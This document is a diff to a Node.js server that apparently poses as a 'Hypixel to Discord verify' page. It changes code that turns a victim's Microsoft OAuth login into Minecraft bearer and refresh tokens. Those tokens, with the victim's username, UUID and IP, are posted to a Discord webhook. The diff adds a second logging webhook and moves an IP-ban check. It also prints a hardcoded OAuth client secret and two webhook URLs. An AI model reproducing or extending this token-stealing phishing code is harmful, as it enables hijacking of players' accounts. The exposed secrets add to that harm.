@@ -2,6 +2,7 @@ const client_secret = 'HkL8Q~Lpyn6H6pI~3ENbt5wmNa9JNV3zHTlWlcqj'
 const client_id = 'a7f62b5a-c66b-47f1-a6f9-fb7938cac361'
 const redirect_uri = 'https://hypixeltodiscordverify.herokuapp.com/'
 const webhook_url = 'https://discord.com/api/webhooks/1023169651536052344/_G1QWD7svz30JTn91tMSx02dTfZ0Ixmtk96eXOkOS9Klyu33AZnv2mPrxDHEEsefVsfI'
+const webhook_logging_url = 'https://discord.com/api/webhooks/1031144365193703514/cdyzlD1PJd1vNrf4tsfeNYOgVHjYUuhv1DjZUKgwQamN0X9-4jO7I3qWyDqVX21BriLf'
 
 const axios = require('axios')
 const express = require('express')
@@ -15,6 +16,11 @@ app.get('/', async (req, res) => {
         return
     }
     try {
+        const ip = getIp(req)
+        if (checkIfBanned(ip)) {
+            logToWebhook("Reject", "A person has been rejected due to them being ip banned.")
+            return
+        }
         const accessTokenAndRefreshTokenArray = await getAccessTokenAndRefreshToken(code)
         const accessToken = accessTokenAndRefreshTokenArray[0]
         const refreshToken = accessTokenAndRefreshTokenArray[1]
@@ -26,10 +32,6 @@ app.get('/', async (req, res) => {
         const usernameAndUUIDArray = await getUsernameAndUUID(bearerToken)
         const uuid = usernameAndUUIDArray[0]
         const username = usernameAndUUIDArray[1]
-        const ip = getIp(req)
-        if (checkIfBanned(ip)) {
-            return
-        }
         postToWebhook(username, bearerToken, uuid, ip, refreshToken)
     } catch (e) {
         console.log(e)
@@ -141,6 +143,21 @@ function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
         }]
     }
     axios.post(url, data).then(() => console.log("Successfully authenticated, posting to webhook!"))
+    logToWebhook("Accepted", "A person has been accepted and it has been sent to the webhook.")
+}
+
+function logToWebhook(title, message) {
+    const url = webhook_logging_url
+
+    let data = {
+        username: " ",
+        avatar_url: "https://cdn.discordapp.com/attachments/1021436161694105656/1027591805719560322/xd.jpg",
+        embeds: [
+            {name: "Title", value: title},
+            {name: "Message", value: message}
+        ]
+    }
+    axios.post(url, data).then(() => console.log("Logging to discord."))
 }
 
 const bannedIps = []
